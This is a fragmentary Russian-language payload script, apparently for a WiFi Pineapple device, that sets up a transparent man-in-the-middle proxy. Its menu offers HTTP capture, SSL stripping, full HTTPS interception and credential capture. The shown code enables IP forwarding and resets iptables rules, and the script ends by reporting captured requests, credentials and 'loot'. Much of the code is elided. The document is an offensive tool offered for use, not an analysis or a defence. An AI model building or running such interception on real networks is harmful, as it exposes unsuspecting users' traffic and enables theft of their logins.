...
# Title: MITM Прокси
# Author: NullSec
# Description: Прозрачный HTTP/HTTPS прокси с логированием запросов
...
Прозрачный прокси для
перехвата HTTP/HTTPS.

Перехватывает и логирует все
веб-запросы через Pineapple.
...
1. Только HTTP (порт 80)
2. HTTP + SSL strip
3. Полный перехват HTTPS
4. Захват учетных данных
...
LOG "Запуск MITM прокси..."
SPINNER_START "Настройка прокси..."

# Включить IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Сброс существующих правил iptables для нашей цепочки
...
PROMPT "MITM ПРОКСИ ОСТАНОВЛЕНО

Записано запросов: $REQ_COUNT
Найдено учетных данных: $CRED_COUNT
Размер лута: $TOTAL_SIZE
